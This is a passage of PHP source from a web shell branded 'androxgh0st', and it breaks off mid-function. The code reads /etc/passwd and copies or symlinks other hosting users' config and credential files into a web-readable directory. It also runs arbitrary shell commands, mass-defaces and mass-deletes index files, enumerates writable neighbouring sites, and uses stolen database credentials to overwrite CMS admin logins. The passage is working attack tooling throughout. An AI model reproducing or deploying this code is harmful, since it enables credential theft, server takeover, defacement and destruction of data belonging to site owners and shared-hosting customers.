exe("ln -s ".$user."/httpdocs/config/settings.inc.php androxgh0st_symvhosts/".$jembod."-PrestaShop.txt");
exe("ln -s ".$user."/httpdocs/app/etc/local.xml androxgh0st_symvhosts/".$jembod."-Magento.txt");
exe("ln -s ".$user."/httpdocs/admin/config.php androxgh0st_symvhosts/".$jembod."-OpenCart.txt");
exe("ln -s ".$user."/httpdocs/application/config/database.php androxgh0st_symvhosts/".$jembod."-Ellislab.txt"); 
}}}
if($_POST['config'] == 'symlink') {
@mkdir("androxgh0st_symconfig", 0777);
@symlink("/","androxgh0st_symconfig/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex androxgh0st.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("androxgh0st_symconfig/.htaccess",$htaccess);}
if($_POST['config'] == '404') {
@mkdir("androxgh0st_sym404", 0777);
@symlink("/","androxgh0st_sym404/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex androxgh0st.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*
IndexIgnore *.txt404
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} ^.*androxgh0st_sym404 [NC]
RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
@file_put_contents("androxgh0st_sym404/.htaccess",$htaccess);
}
if($_POST['config'] == 'grab') {
						mkdir("androxgh0st_configgrab", 0777);
						$isi_htc = "Options all\nRequire None\nSatisfy Any";
						$htc = fopen("androxgh0st_configgrab/.htaccess","w");
						fwrite($htc, $isi_htc);	
}
$passwd = $_POST['passwd'];

preg_match_all('/(.*?);x:/', $passwd, $user_config);
foreach($user_config[1] as $user_androxgh0st) {
$grab_config = array(
"/home/$user_androxgh0st/.accesshash" => "WHM-accesshash",
"/home/$user_androxgh0st/.my.cnf" => "Cpanel",
"/home/$user_androxgh0st/whmcsdata/crons/config.php" => "WHMCSdata",
"/home/$user_androxgh0st/public_html/config/koneksi.php" => "Lokomedia",
"/home/$user_androxgh0st/public_html/forum/config.php" => "phpBB",
"/home/$user_androxgh0st/public_html/sites/default/settings.php" => "Drupal",
"/home/$user_androxgh0st/public_html/config/settings.inc.php" => "PrestaShop",
"/home/$user_androxgh0st/public_html/app/etc/local.xml" => "Magento",
"/home/$user_androxgh0st/public_html/admin/config.php" => "OpenCart",
"/home/$user_androxgh0st/public_html/application/config/database.php" => "Ellislab",
"/home/$user_androxgh0st/public_html/vb/includes/config.php" => "Vbulletin",
"/home/$user_androxgh0st/public_html/includes/config.php" => "Vbulletin",
"/home/$user_androxgh0st/public_html/forum/includes/config.php" => "Vbulletin",
"/home/$user_androxgh0st/public_html/forums/includes/config.php" => "Vbulletin",
"/home/$user_androxgh0st/public_html/cc/includes/config.php" => "Vbulletin",
"/home/$user_androxgh0st/public_html/inc/config.php" => "MyBB",
"/home/$user_androxgh0st/public_html/includes/configure.php" => "OsCommerce",
"/home/$user_androxgh0st/public_html/shop/includes/configure.php" => "OsCommerce",
"/home/$user_androxgh0st/public_html/os/includes/configure.php" => "OsCommerce",
"/home/$user_androxgh0st/public_html/oscom/includes/configure.php" => "OsCommerce",
"/home/$user_androxgh0st/public_html/products/includes/configure.php" => "OsCommerce",
"/home/$user_androxgh0st/public_html/cart/includes/configure.php" => "OsCommerce",
"/home/$user_androxgh0st/public_html/inc/conf_global.php" => "IPB",
"/home/$user_androxgh0st/public_html/wp-config.php" => "Wordpress",
"/home/$user_androxgh0st/public_html/wp/test/wp-config.php" => "Wordpress",
"/home/$user_androxgh0st/public_html/blog/wp-config.php" => "Wordpress",
"/home/$user_androxgh0st/public_html/beta/wp-config.php" => "Wordpress",
"/home/$user_androxgh0st/public_html/portal/wp-config.php" => "Wordpress",
"/home/$user_androxgh0st/public_html/site/wp-config.php" => "Wordpress",
"/home/$user_androxgh0st/public_html/wp/wp-config.php" => "Wordpress",
"/home/$user_androxgh0st/public_html/WP/wp-config.php" => "Wordpress",
"/home/$user_androxgh0st/public_html/news/wp-config.php" => "Wordpress",
"/home/$user_androxgh0st/public_html/wordpress/wp-config.php" => "Wordpress",
"/home/$user_androxgh0st/public_html/test/wp-config.php" => "Wordpress",
"/home/$user_androxgh0st/public_html/demo/wp-config.php" => "Wordpress",
"/home/$user_androxgh0st/public_html/home/wp-config.php" => "Wordpress",
"/home/$user_androxgh0st/public_html/v1/wp-config.php" => "Wordpress",
"/home/$user_androxgh0st/public_html/v2/wp-config.php" => "Wordpress",
"/home/$user_androxgh0st/public_html/press/wp-config.php" => "Wordpress",
"/home/$user_androxgh0st/public_html/new/wp-config.php" => "Wordpress",
"/home/$user_androxgh0st/public_html/blogs/wp-config.php" => "Wordpress",
"/home/$user_androxgh0st/public_html/configuration.php" => "Joomla",
"/home/$user_androxgh0st/public_html/blog/configuration.php" => "Joomla",
"/home/$user_androxgh0st/public_html/submitticket.php" => "^WHMCS",
"/home/$user_androxgh0st/public_html/cms/configuration.php" => "Joomla",
"/home/$user_androxgh0st/public_html/beta/configuration.php" => "Joomla",
"/home/$user_androxgh0st/public_html/portal/configuration.php" => "Joomla",
"/home/$user_androxgh0st/public_html/site/configuration.php" => "Joomla",
"/home/$user_androxgh0st/public_html/main/configuration.php" => "Joomla",
"/home/$user_androxgh0st/public_html/home/configuration.php" => "Joomla",
"/home/$user_androxgh0st/public_html/demo/configuration.php" => "Joomla",
"/home/$user_androxgh0st/public_html/test/configuration.php" => "Joomla",
"/home/$user_androxgh0st/public_html/v1/configuration.php" => "Joomla",
"/home/$user_androxgh0st/public_html/v2/configuration.php" => "Joomla",
"/home/$user_androxgh0st/public_html/joomla/configuration.php" => "Joomla",
"/home/$user_androxgh0st/public_html/new/configuration.php" => "Joomla",
"/home/$user_androxgh0st/public_html/WHMCS/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/whmcs1/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Whmcs/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/whmcs/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/whmcs/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/WHMC/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Whmc/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/whmc/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/WHM/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Whm/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/whm/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/HOST/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Host/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/host/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/SUPPORTES/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Supportes/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/supportes/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/domains/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/domain/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Hosting/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/HOSTING/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/hosting/configuration.php" => "WHMCSorJoomla",
"/home/$user_androxgh0st/public_html/CART/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Cart/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/cart/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/ORDER/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Order/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/order/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/CLIENT/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Client/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/client/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/CLIENTAREA/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Clientarea/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/clientarea/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/SUPPORT/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Support/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/support/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/BILLING/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Billing/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/billing/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/BUY/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Buy/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/buy/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/MANAGE/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Manage/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/manage/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/CLIENTSUPPORT/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/ClientSupport/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Clientsupport/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/clientsupport/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/CHECKOUT/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Checkout/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/checkout/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/BILLINGS/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Billings/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/billings/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/BASKET/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Basket/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/basket/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/SECURE/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Secure/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/secure/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/SALES/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Sales/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/sales/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/BILL/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Bill/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/bill/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/PURCHASE/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Purchase/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/purchase/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/ACCOUNT/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Account/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/account/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/USER/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/User/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/user/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/CLIENTS/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Clients/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/clients/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/BILLINGS/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/Billings/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/billings/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/MY/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/My/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/my/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/secure/whm/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/secure/whmcs/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/panel/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/clientes/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/cliente/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/support/order/configuration.php" => "WHMCSorJOOMLA",
"/home/$user_androxgh0st/public_html/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/boxbilling/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/box/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/host/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/Host/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/supportes/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/support/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/hosting/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/cart/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/order/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/client/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/clients/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/cliente/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/clientes/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/billing/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/billings/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/my/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/secure/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/support/order/bb-config.php" => "BoxBilling",
"/home/$user_androxgh0st/public_html/includes/dist-configure.php" => "Zencart",
"/home/$user_androxgh0st/public_html/zencart/includes/dist-configure.php" => "Zencart",
"/home/$user_androxgh0st/public_html/products/includes/dist-configure.php" => "Zencart",
"/home/$user_androxgh0st/public_html/cart/includes/dist-configure.php" => "Zencart",
"/home/$user_androxgh0st/public_html/shop/includes/dist-configure.php" => "Zencart",
"/home/$user_androxgh0st/public_html/includes/iso4217.php" => "Hostbills",
"/home/$user_androxgh0st/public_html/hostbills/includes/iso4217.php" => "Hostbills",
"/home/$user_androxgh0st/public_html/host/includes/iso4217.php" => "Hostbills",
"/home/$user_androxgh0st/public_html/Host/includes/iso4217.php" => "Hostbills",
"/home/$user_androxgh0st/public_html/supportes/includes/iso4217.php" => "Hostbills",
"/home/$user_androxgh0st/public_html/support/includes/iso4217.php" => "Hostbills",
"/home/$user_androxgh0st/public_html/hosting/includes/iso4217.php" => "Hostbills",
"/home/$user_androxgh0st/public_html/cart/includes/iso4217.php" => "Hostbills",
"/home/$user_androxgh0st/public_html/order/includes/iso4217.php" => "Hostbills",
"/home/$user_androxgh0st/public_html/client/includes/iso4217.php" => "Hostbills",
"/home/$user_androxgh0st/public_html/clients/includes/iso4217.php" => "Hostbills",
"/home/$user_androxgh0st/public_html/cliente/includes/iso4217.php" => "Hostbills",
"/home/$user_androxgh0st/public_html/clientes/includes/iso4217.php" => "Hostbills",
"/home/$user_androxgh0st/public_html/billing/includes/iso4217.php" => "Hostbills",
"/home/$user_androxgh0st/public_html/billings/includes/iso4217.php" => "Hostbills",
"/home/$user_androxgh0st/public_html/my/includes/iso4217.php" => "Hostbills",
"/home/$user_androxgh0st/public_html/secure/includes/iso4217.php" => "Hostbills",
"/home/$user_androxgh0st/public_html/support/order/includes/iso4217.php" => "Hostbills"
);  

foreach($grab_config as $config => $nama_config) {
	if($_POST['config'] == 'grab') {
$ambil_config = file_get_contents($config);
if($ambil_config == '') {
} else {
$file_config = fopen("androxgh0st_configgrab/$user_androxgh0st-$nama_config.txt","w");
fputs($file_config,$ambil_config);
}
}
if($_POST['config'] == 'symlink') {
@symlink($config,"androxgh0st_Symconfig/".$user_androxgh0st."-".$nama_config.".txt");
}
if($_POST['config'] == '404') {
$sym404=symlink($config,"androxgh0st_sym404/".$user_androxgh0st."-".$nama_config.".txt");
if($sym404){
	@mkdir("androxgh0st_sym404/".$user_androxgh0st."-".$nama_config.".txt404", 0777);
	$htaccess="Options Indexes FollowSymLinks
DirectoryIndex androxgh0st.htm
HeaderName androxgh0st.txt
Satisfy Any
IndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble
IndexIgnore *";

@file_put_contents("androxgh0st_sym404/".$user_androxgh0st."-".$nama_config.".txt404/.htaccess",$htaccess);

@symlink($config,"androxgh0st_sym404/".$user_androxgh0st."-".$nama_config.".txt404/androxgh0st.txt");

	}

}

                    }     
		}  if($_POST['config'] == 'grab') {
            echo "<center><a href='?dir=$dir/androxgh0st_configgrab'><font color=lime>Done</font></a></center>";
		}
    if($_POST['config'] == '404') {
    	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
        echo "<center>
<a href=\"$full/androxgh0st_sym404/root/\">SymlinkNya</a>
<br><a href=\"$full/androxgh0st_sym404/\">Configurations</a></center>";
    }
     if($_POST['config'] == 'symlink') {
     	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
echo "<center>
<a href=\"$full/androxgh0st_symconfig/root/\">Symlinknya</a>
<br><a href=\"$full/androxgh0st_symconfig/\">Configurations</a></center>";
			}if($_POST['config'] == 'symvhost') {
echo "<center>
<a href=\"$full/androxgh0st_symvhost/root/\">Root Server</a>
<br><a href=\"$full/androxgh0st_symvhost/\">Configurations</a></center>";
			}
		
		
		}else{
        echo "<form method=\"post\" action=\"\"><center>
		</center></select><br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
        echo include("/etc/passwd"); 
        echo "</textarea><br><br>
        <select class=\"select\" name=\"config\"  style=\"width: 450px;\" height=\"10\">
        <option value=\"grab\">Config Grab</option>
        <option value=\"symlink\">Symlink Config</option>
		<option value=\"404\">Config 404</option>
		<option value=\"symvhosts\">Vhosts Config Grabber</option><br><br><input type=\"submit\" value=\"Start!!\"></td></tr></center>\n";
}
} elseif($_GET['do'] == 'cmd') {
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
} elseif($_GET['do'] == 'mass_deface') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Sabun:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by androxgh0st</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
} elseif($_GET['do'] == 'mass_delete') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
	</form></center>";
	}
} elseif($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts|vhost/", $dir)) {
		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace("www.", "", $url);
				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?);x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
} elseif($_GET['do'] == 'auto_edit_user') {
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
                	$prefix = $dbprefix."users";
	                $option = $dbprefix."options";
	                $meta = $dbprefix."usermeta";
	                $capa = $dbprefix."capabilities";
	                $level = $dbprefix."user_level";
	                $conn = new mysqli($dbhost,$dbuser,$dbpass,$dbname);
	                $q = $conn->query("SELECT * FROM $prefix ORDER BY id ASC");
	                $result = $q->fetch_array();
